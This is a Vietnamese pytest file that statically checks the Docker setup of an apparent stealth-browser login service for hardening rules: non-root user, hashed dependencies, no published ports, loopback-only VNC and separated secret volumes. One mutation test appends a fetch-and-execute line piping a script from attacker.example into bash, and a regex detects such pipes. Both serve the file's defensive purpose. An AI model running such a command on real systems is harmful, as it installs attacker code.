# test_c2a_dockerfile.py — Kiểm tra cấu trúc tĩnh Dockerfile, docker-compose, supervisord, entrypoint và .dockerignore
from __future__ import annotations

import re
from pathlib import Path

import pytest

GOC = Path(__file__).resolve().parent
DOCKERFILE_PATH = GOC / "Dockerfile"
COMPOSE_PATH = GOC / "docker-compose.yml"
SUPERVISORD_PATH = GOC / "supervisord.conf"
ENTRYPOINT_PATH = GOC / "entrypoint.sh"
DOCKERIGNORE_PATH = GOC / ".dockerignore"


def _doc_dockerfile() -> str:
    assert DOCKERFILE_PATH.is_file(), "Thiếu tệp Dockerfile"
    return DOCKERFILE_PATH.read_text(encoding="utf-8")


def _doc_compose() -> str:
    assert COMPOSE_PATH.is_file(), "Thiếu tệp docker-compose.yml"
    return COMPOSE_PATH.read_text(encoding="utf-8")


def _doc_supervisord() -> str:
    assert SUPERVISORD_PATH.is_file(), "Thiếu tệp supervisord.conf"
    return SUPERVISORD_PATH.read_text(encoding="utf-8")


def _doc_entrypoint() -> str:
    assert ENTRYPOINT_PATH.is_file(), "Thiếu tệp entrypoint.sh"
    return ENTRYPOINT_PATH.read_text(encoding="utf-8")


def _doc_dockerignore() -> str:
    assert DOCKERIGNORE_PATH.is_file(), "Thiếu tệp .dockerignore"
    return DOCKERIGNORE_PATH.read_text(encoding="utf-8")


def kiem_dockerfile(df: str) -> list[str]:
    loi = []
    # 1. USER không root
    if not re.search(r"^USER\s+(?!0\b)(?!root\b)\S+", df, flags=re.M):
        loi.append("Dockerfile phải chuyển sang USER không root")

    # 2. Không curl | sh, không apt-key
    if re.search(r"\|\s*(ba)?sh(\s|;|$)", df):
        loi.append("Dockerfile cấm curl | sh/bash")
    if "apt-key" in df:
        loi.append("Dockerfile cấm apt-key")

    # 3. Pip require hashes
    for line in df.splitlines():
        if "pip install" in line and "--require-hashes" not in line:
            loi.append(f"Dòng pip install thiếu --require-hashes: {line}")

    # 4. ENV PLAYWRIGHT_BROWSERS_PATH và CLOAKBROWSER_CACHE_DIR và HOME
    if "PLAYWRIGHT_BROWSERS_PATH=" not in df:
        loi.append("Dockerfile thiếu ENV PLAYWRIGHT_BROWSERS_PATH")
    if "CLOAKBROWSER_CACHE_DIR=" not in df:
        loi.append("Dockerfile thiếu ENV CLOAKBROWSER_CACHE_DIR")
    if "HOME=/home/appuser" not in df:
        loi.append("Dockerfile thiếu ENV HOME=/home/appuser")

    # 5. Giá trị không nằm dưới /root
    for line in df.splitlines():
        if "PLAYWRIGHT_BROWSERS_PATH=" in line and "/root" in line:
            loi.append("PLAYWRIGHT_BROWSERS_PATH không được nằm dưới /root")
        if "CLOAKBROWSER_CACHE_DIR=" in line and "/root" in line:
            loi.append("CLOAKBROWSER_CACHE_DIR không được nằm dưới /root")

    # 6. Đặt TRƯỚC dòng install đầu tiên
    dong_env = None
    dong_install = None
    for idx, line in enumerate(df.splitlines(), start=1):
        if ("PLAYWRIGHT_BROWSERS_PATH=" in line or "CLOAKBROWSER_CACHE_DIR=" in line) and dong_env is None:
            dong_env = idx
        if ("cloakbrowser install" in line or "patchright install" in line) and dong_install is None:
            dong_install = idx
    if dong_env and dong_install and dong_env > dong_install:
        loi.append("ENV PLAYWRIGHT_BROWSERS_PATH/CLOAKBROWSER_CACHE_DIR phải đặt TRƯỚC lệnh install")

    # 7. Không còn firefox-esr
    if "firefox-esr" in df:
        loi.append("Dockerfile không được cài firefox-esr (thay bằng patchright install --with-deps firefox)")

    # 8. Có --with-deps firefox (NV206: bằng playwright CHÍNH GỐC — patchright chỉ
    # vá cho Chromium/CDP, driver của nó hỏng mọi thao tác trang trên Firefox)
    if "--with-deps firefox" not in df:
        loi.append("Dockerfile phải dùng 'playwright install --with-deps firefox'")

    # 9. Phân nhánh BIEN_THE: tồn tại điều kiện [ "$BIEN_THE" ... ] cho firefox và chromium
    co_nhanh_firefox = bool(re.search(r'\[\s*"\$BIEN_THE"\s*!=\s*"chromium"\s*\]', df) or re.search(r'\[\s*"\$BIEN_THE"\s*=\s*"firefox"', df))
    co_nhanh_chromium = bool(re.search(r'\[\s*"\$BIEN_THE"\s*!=\s*"firefox"\s*\]', df) or re.search(r'\[\s*"\$BIEN_THE"\s*=\s*"chromium"', df))
    if not co_nhanh_firefox:
        loi.append("Dockerfile thiếu điều kiện phân nhánh cho biến thể firefox")
    if not co_nhanh_chromium:
        loi.append("Dockerfile thiếu điều kiện phân nhánh cho biến thể chromium")

    # 10. Quyền thư mục trình duyệt: chown 1000:1000 /opt/cloakbrowser
    if "/opt/cloakbrowser" in df:
        if not re.search(r"chown\s+(-R\s+)?(1000:1000|appuser:appuser)\s+/opt/cloakbrowser", df):
            loi.append("Dockerfile phải chown 1000:1000 cho /opt/cloakbrowser")

    # 11. Locale, timezone, CJK
    if "LANG=vi_VN.UTF-8" not in df:
        loi.append("Dockerfile thiếu LANG=vi_VN.UTF-8")
    if "TZ=Asia/Ho_Chi_Minh" not in df:
        loi.append("Dockerfile thiếu TZ=Asia/Ho_Chi_Minh")
    if "fonts-noto-cjk" not in df:
        loi.append("Dockerfile thiếu fonts-noto-cjk")

    return loi


def kiem_compose(comp: str) -> list[str]:
    loi = []
    if not re.search(r"cap_drop:\s*\n\s*-\s*ALL", comp):
        loi.append("Compose phải cap_drop ALL")
    if re.search(r"^\s*ports:", comp, flags=re.M):
        loi.append("Compose không được công bố ports")
    if "expose:" not in comp:
        loi.append("Compose phải có expose nội bộ")
    if "privileged" in comp and not re.search(r"^\s*#.*privileged", comp, flags=re.M):
        loi.append("Compose cấm privileged")
    if "network_mode: host" in comp:
        loi.append("Compose cấm network_mode: host")
    if "docker.sock" in comp:
        loi.append("Compose cấm mount docker.sock")
    if "read_only: true" in comp:
        if "/home/appuser" not in comp:
            loi.append("Compose read_only: true phải có tmpfs cho /home/appuser")
        elif not re.search(r"/home/appuser:size=\d+m,mode=0700,uid=1000,gid=1000", comp):
            loi.append("tmpfs /home/appuser phải có mode=0700,uid=1000,gid=1000")
    return loi


def kiem_supervisord(sup: str) -> list[str]:
    loi = []
    found = False
    for line in sup.splitlines():
        if line.strip().startswith("command=") and "x11vnc" in line:
            found = True
            if "-nopw" in line:
                loi.append("x11vnc KHÔNG được dùng -nopw")
            if "-passwdfile" not in line and "-rfbauth" not in line:
                loi.append("x11vnc phải đọc mật khẩu từ tệp")
            if "-listen 127.0.0.1" not in line:
                loi.append("x11vnc phải -listen 127.0.0.1")
    if not found:
        loi.append("Phải tìm thấy lệnh command x11vnc trong cấu hình noVNC")
    return loi


def kiem_entrypoint(ep: str) -> list[str]:
    loi = []
    if "/tmp/.X11-unix" not in ep or "1777" not in ep:
        loi.append("entrypoint.sh phải tạo /tmp/.X11-unix với quyền 1777")
    if "head -c 8" not in ep or "A-Za-z0-9" not in ep:
        loi.append("entrypoint.sh phải sinh mật khẩu VNC 8 ký tự từ bảng chữ-số (A-Za-z0-9) bằng head -c 8")
    if "od -tx1" in ep:
        loi.append("entrypoint.sh không được dùng od -tx1 cho mật khẩu VNC")
    for line in ep.splitlines():
        strip = line.strip()
        if (strip.startswith("echo ") or strip.startswith("cat ")) and "mat-khau-vnc" in strip:
            loi.append("entrypoint.sh không được in mật khẩu VNC ra stdout")
    return loi


def kiem_requirements_co_hash(text: str) -> list[str]:
    loi = []
    gop_dong = []
    buf = ""
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if line.endswith("\\"):
            buf += line[:-1].strip() + " "
        else:
            buf += line
            gop_dong.append(buf.strip())
            buf = ""
    if buf:
        gop_dong.append(buf.strip())

    for line in gop_dong:
        if line.startswith("-") and not line.startswith("--hash"):
            continue
        if "==" in line:
            if "--hash=sha256:" not in line:
                loi.append(f"Dòng gói thiếu --hash=sha256: {line[:50]}")
    return loi


def test_dockerfile_chuan():
    df = _doc_dockerfile()
    loi = kiem_dockerfile(df)
    assert not loi, f"Dockerfile không chuẩn: {loi}"


def test_compose_chuan():
    comp = _doc_compose()
    loi = kiem_compose(comp)
    assert not loi, f"Compose không chuẩn: {loi}"


def test_supervisord_chuan():
    novnc_path = GOC / "supervisord-novnc.conf"
    assert novnc_path.is_file(), "Thiếu tệp supervisord-novnc.conf"
    sup = novnc_path.read_text(encoding="utf-8")
    loi = kiem_supervisord(sup)
    assert not loi, f"supervisord-novnc.conf không chuẩn: {loi}"



def test_entrypoint_chuan():
    ep = _doc_entrypoint()
    loi = kiem_entrypoint(ep)
    assert not loi, f"entrypoint.sh không chuẩn: {loi}"


def test_requirements_cac_goi_co_hash_va_phien_ban():
    for f in GOC.glob("requirements-*.txt"):
        lines = f.read_text(encoding="utf-8")
        loi = kiem_requirements_co_hash(lines)
        assert not loi, f"Tệp {f.name} có gói thiếu sha256 hash: {loi}"


def test_dockerfile_copy_ton_tai_va_khong_copy_bi_mat():
    df = _doc_dockerfile()
    for line in df.splitlines():
        line = line.strip()
        if line.startswith("COPY "):
            parts = line.split()
            srcs = [p for p in parts[1:-1] if not p.startswith("--")]
            for src in srcs:
                src_path = GOC / src
                assert src_path.exists(), f"Nguồn COPY không tồn tại: {src}"
                assert "accounts.db" not in src
                assert ".env" not in src
                assert "vault.key" not in src
                assert "khoa-dich-vu" not in src


def test_dockerignore_loai_du_tep():
    di = _doc_dockerignore()
    cac_mau = ["data/", "*.db", ".env", ".venv", "__pycache__", "nguon-c2a/", "test_*.py", "_gia_goi.py"]
    for m in cac_mau:
        assert m in di, f".dockerignore thiếu {m}"


def test_dot_bien_dockerfile():
    """Mutation testing: nếu Dockerfile bị sửa vi phạm -> kiem_dockerfile phát hiện lỗi."""
    df_goc = _doc_dockerfile()

    # (a) Bỏ USER không root
    df_khong_user = re.sub(r"^USER\s+\S+", "", df_goc, flags=re.M)
    loi_user = kiem_dockerfile(df_khong_user)
    assert any("USER không root" in err for err in loi_user), "Phải phát hiện thiếu USER"

    # (b) Xoá ENV PLAYWRIGHT_BROWSERS_PATH
    df_khong_env = re.sub(r"PLAYWRIGHT_BROWSERS_PATH=\S+", "", df_goc)
    loi_env = kiem_dockerfile(df_khong_env)
    assert any("PLAYWRIGHT_BROWSERS_PATH" in err for err in loi_env), "Phải phát hiện thiếu PLAYWRIGHT_BROWSERS_PATH"

    # (c) Đưa đường dẫn browser vào /root
    df_root_browser = df_goc.replace("/opt/ms-playwright", "/root/.cache/ms-playwright")
    loi_root = kiem_dockerfile(df_root_browser)
    assert any("/root" in err for err in loi_root), "Phải phát hiện browser nằm dưới /root"

    # (d) Cài curl | sh
    df_curl_sh = df_goc + "\nRUN curl http://attacker.example/install.sh | bash\n"
    loi_curl = kiem_dockerfile(df_curl_sh)
    assert any("cấm curl" in err for err in loi_curl), "Phải phát hiện curl | sh"


def test_dot_bien_compose():
    """Mutation testing: nếu Compose bị sửa vi phạm -> kiem_compose phát hiện lỗi."""
    comp_goc = _doc_compose()

    # (a) Thêm ports:
    comp_co_port = comp_goc + '\n    ports:\n      - "8010:8010"\n'
    loi_port = kiem_compose(comp_co_port)
    assert any("ports" in err for err in loi_port), "Phải phát hiện khai báo ports"

    # (b) Bỏ tmpfs /home/appuser
    comp_khong_home = comp_goc.replace('"/home/appuser:size=256m,mode=0700,uid=1000,gid=1000"', '""')
    loi_home = kiem_compose(comp_khong_home)
    assert any("/home/appuser" in err for err in loi_home), "Phải phát hiện thiếu tmpfs /home/appuser"


def test_dot_bien_entrypoint():
    """Mutation testing: nếu entrypoint vi phạm -> kiem_entrypoint phát hiện lỗi."""
    ep_goc = _doc_entrypoint()

    # (a) Bỏ /tmp/.X11-unix
    ep_khong_x11 = re.sub(r".*/tmp/\.X11-unix.*", "", ep_goc)
    loi_x11 = kiem_entrypoint(ep_khong_x11)
    assert any("/tmp/.X11-unix" in err for err in loi_x11), "Phải phát hiện thiếu /tmp/.X11-unix"

    # (b) Dùng od -tx1
    ep_od = ep_goc + "\nhead -c 16 /dev/urandom | od -tx1\n"
    loi_od = kiem_entrypoint(ep_od)
    assert any("od -tx1" in err for err in loi_od), "Phải phát hiện dùng od -tx1"


def test_bien_the_du_goi_phu_thuoc_trong_in():
    """Quét AST các import của tập tệp src/ được dùng và kiểm tra đầy đủ gói trong requirements-*.in cho từng biến thể."""
    import ast
    from test_c2a_nguyen_van import _lay_cac_tep_duoc_import

    goc_src = GOC / "src"
    tap_tep = _lay_cac_tep_duoc_import(goc_src)
    assert tap_tep, "Tập tệp import không được rỗng"

    ANH_XA_IMPORT_SANG_GOI = {
        "cryptography": "cryptography",
        "fastapi": "fastapi",
        "httpx": "httpx",
        "pydantic": "pydantic",
        "pydantic_settings": "pydantic-settings",
        "pyotp": "pyotp",
        "patchright": "patchright",
        "cloakbrowser": "cloakbrowser",
        "playwright": "playwright",
        "uvicorn": "uvicorn",
    }

    # Các gói tuỳ chọn theo tính năng hoặc biến thể riêng
    GOI_TUY_CHON = {
        "cloakbrowser",         # Chỉ dành cho biến thể chromium/ca-hai
        "playwright",           # Cloakbrowser gọi nội bộ hoặc thay thế patchright
        "playwright_recaptcha", # Chỉ khi CAI_GIAI_CAPTCHA=1
        "speech_recognition",   # Chỉ khi CAI_GIAI_CAPTCHA=1
        "pydub",                # Chỉ khi CAI_GIAI_CAPTCHA=1
    }

    def _doc_goi_in(tep_in: Path) -> set[str]:
        goi = set()
        for line in tep_in.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            ten = re.split(r"[=<>~]", line)[0].strip().lower().replace("_", "-")
            goi.add(ten)
        return goi

    goi_nen = _doc_goi_in(GOC / "requirements-nen.in")
    goi_chromium = _doc_goi_in(GOC / "requirements-chromium.in")

    tap_bien_the = {
        "firefox": goi_nen,
        "chromium": goi_nen | goi_chromium,
        "ca-hai": goi_nen | goi_chromium,
    }

    # Quét tất cả import trong tập tệp
    cac_goi_can = set()
    for f in tap_tep:
        tree = ast.parse(f.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            mod_name = None
            if isinstance(node, ast.Import):
                for alias in node.names:
                    mod_name = alias.name.split(".")[0]
                    if mod_name in ANH_XA_IMPORT_SANG_GOI:
                        cac_goi_can.add(ANH_XA_IMPORT_SANG_GOI[mod_name])
            elif isinstance(node, ast.ImportFrom) and node.module and not node.level:
                mod_name = node.module.split(".")[0]
                if mod_name in ANH_XA_IMPORT_SANG_GOI:
                    cac_goi_can.add(ANH_XA_IMPORT_SANG_GOI[mod_name])

    # Gói bắt buộc cho mọi biến thể (không nằm trong danh sách tuỳ chọn)
    goi_bat_buoc = cac_goi_can - GOI_TUY_CHON

    for bien_the, goi_co in tap_bien_the.items():
        thieu = goi_bat_buoc - goi_co
        assert not thieu, f"Biến thể '{bien_the}' thiếu gói bắt buộc trong requirements .in: {thieu}"


def test_compose_tach_volume_khoa_va_du_lieu():
    """Kiểm tra:
    (a) Compose có đúng 2 volume tên riêng: web2api_may_dang_nhap_khoa và web2api_may_dang_nhap_du_lieu.
    (b) /data và /khoa là hai điểm gắn riêng biệt.
    (c) Không tệp khoá nào (vault.key, khoa-dich-vu, mat-khau-vnc) trong entrypoint.sh và supervisord.conf trỏ vào /data.
    (d) Dockerfile tạo /khoa với quyền 0700 và khai báo VOLUME có /khoa.
    """
    comp = _doc_compose()
    assert "web2api_may_dang_nhap_khoa" in comp, "Compose thiếu volume web2api_may_dang_nhap_khoa"
    assert "web2api_may_dang_nhap_du_lieu" in comp, "Compose thiếu volume web2api_may_dang_nhap_du_lieu"
    assert ":/data" in comp, "Compose thiếu điểm gắn /data"
    assert ":/khoa" in comp, "Compose thiếu điểm gắn /khoa"

    ep = _doc_entrypoint()
    assert "/data/mat-khau-vnc" not in ep, "entrypoint.sh không được lưu mat-khau-vnc trong /data"
    assert "/khoa/mat-khau-vnc" in ep, "entrypoint.sh phải lưu mat-khau-vnc trong /khoa"

    sup = _doc_supervisord()
    assert "/data/mat-khau-vnc" not in sup, "supervisord.conf không được trỏ mat-khau-vnc vào /data"
    assert "/data/khoa-dich-vu" not in sup, "supervisord.conf không được trỏ khoa-dich-vu vào /data"
    assert "/data/vault.key" not in sup, "supervisord.conf không được trỏ vault.key vào /data"

    df = _doc_dockerfile()
    assert "/khoa" in df, "Dockerfile phải tạo thư mục /khoa"
    assert 'VOLUME ["/data", "/khoa"]' in df or "VOLUME [\"/data\", \"/khoa\"]" in df or ("/khoa" in df and "VOLUME" in df), "Dockerfile phải có VOLUME cho /khoa"


def test_novnc_mac_dinh_tat_va_cau_hinh_an_toan():
    """Kiểm tra:
    (a) supervisord.conf mặc định KHÔNG chứa x11vnc và websockify/novnc.
    (b) supervisord-novnc.conf chứa x11vnc và websockify/novnc nhưng nghe trên loopback 127.0.0.1.
    (c) entrypoint.sh chỉ dùng supervisord-novnc.conf khi CAPTCHA_SOLVER_BAT_NOVNC=1, mặc định dùng supervisord.conf.
    (d) Dockerfile chỉ EXPOSE 8010 (không EXPOSE 6080) và chép cả 2 file cấu hình supervisord.
    (e) docker-compose.yml chỉ expose 8010 (không expose 6080).
    """
    sup_core = _doc_supervisord()
    assert "[program:x11vnc]" not in sup_core, "supervisord.conf mặc định không được chạy x11vnc"
    assert "[program:novnc]" not in sup_core, "supervisord.conf mặc định không được chạy novnc"
    assert "websockify" not in sup_core, "supervisord.conf mặc định không được chạy websockify"

    novnc_conf_path = GOC / "supervisord-novnc.conf"
    assert novnc_conf_path.is_file(), "Thiếu tệp supervisord-novnc.conf"
    sup_novnc = novnc_conf_path.read_text(encoding="utf-8")
    assert "[program:x11vnc]" in sup_novnc, "supervisord-novnc.conf phải có x11vnc"
    assert "[program:novnc]" in sup_novnc, "supervisord-novnc.conf phải có novnc"
    assert "127.0.0.1" in sup_novnc, "x11vnc/websockify phải bind 127.0.0.1"

    ep = _doc_entrypoint()
    assert "CAPTCHA_SOLVER_BAT_NOVNC" in ep, "entrypoint.sh phải kiểm tra CAPTCHA_SOLVER_BAT_NOVNC"
    assert "supervisord-novnc.conf" in ep, "entrypoint.sh phải có nhánh nạp supervisord-novnc.conf"

    df = _doc_dockerfile()
    assert "EXPOSE 8010\n" in df or "EXPOSE 8010" in df, "Dockerfile phải EXPOSE 8010"
    assert "6080" not in [line for line in df.splitlines() if line.strip().startswith("EXPOSE")], "Dockerfile không được EXPOSE 6080"
    assert "supervisord-novnc.conf" in df, "Dockerfile phải copy supervisord-novnc.conf"

    comp = _doc_compose()
    expose_lines = [line.strip() for line in comp.splitlines() if line.strip().startswith("- \"6080\"") or line.strip().startswith("- 6080")]
    assert not expose_lines, "docker-compose.yml không được expose cổng 6080"


def test_d1_compose_mac_dinh_firefox():
    """D1: docker-compose.yml mặc định BIEN_THE: firefox (không tự tải CloakBrowser chưa kiểm giấy phép)."""
    comp = _doc_compose()
    m = re.search(r"BIEN_THE:\s*(\S+)", comp)
    assert m is not None, "docker-compose.yml phải có trường BIEN_THE trong args build"
    assert m.group(1) == "firefox", f"Mặc định compose BIEN_THE phải là firefox, nhận: {m.group(1)}"


def test_d2_dockerfile_ghim_digest():
    """D2: Dockerfile dịch vụ phải ghim digest @sha256:... từ Dockerfile gốc và có chú thích đồng bộ."""
    df = _doc_dockerfile()
    m = re.search(r"^FROM\s+python:3\.13-slim@(sha256:[a-f0-9]{64})", df, flags=re.M)
    assert m is not None, "Dockerfile dịch vụ phải có FROM python:3.13-slim@sha256: đầy đủ"

    # Kiểm tra chú thích đồng bộ
    assert "đồng bộ khi Dockerfile gốc đổi" in df or "dong bo khi Dockerfile goc doi" in df or "đồng bộ khi Dockerfile gốc" in df, \
        "Dockerfile dịch vụ phải có chú thích 'đồng bộ khi Dockerfile gốc đổi'"

    # Đọc Dockerfile gốc để đối chiếu digest
    df_goc = (GOC.parent.parent / "Dockerfile").read_text(encoding="utf-8")
    m_goc = re.search(r"FROM\s+python:3\.13-slim@(sha256:[a-f0-9]{64})", df_goc)
    if m_goc:
        assert m.group(1) == m_goc.group(1), f"Digest dịch vụ ({m.group(1)}) phải khớp Dockerfile gốc ({m_goc.group(1)})"


# ── Mục E3: Đột biến 1 ────────────────────────────────────────────────────────

def test_e3_dot_bien_1_cloakbrowser_auto_update_false():
    """E3 (1): Dockerfile bắt buộc phải có CLOAKBROWSER_AUTO_UPDATE=false; nếu là true test phải đỏ."""
    df = _doc_dockerfile()
    assert "CLOAKBROWSER_AUTO_UPDATE=false" in df, "Dockerfile phải có CLOAKBROWSER_AUTO_UPDATE=false"
    assert "CLOAKBROWSER_AUTO_UPDATE=true" not in df, "Dockerfile không được phép đặt CLOAKBROWSER_AUTO_UPDATE=true"

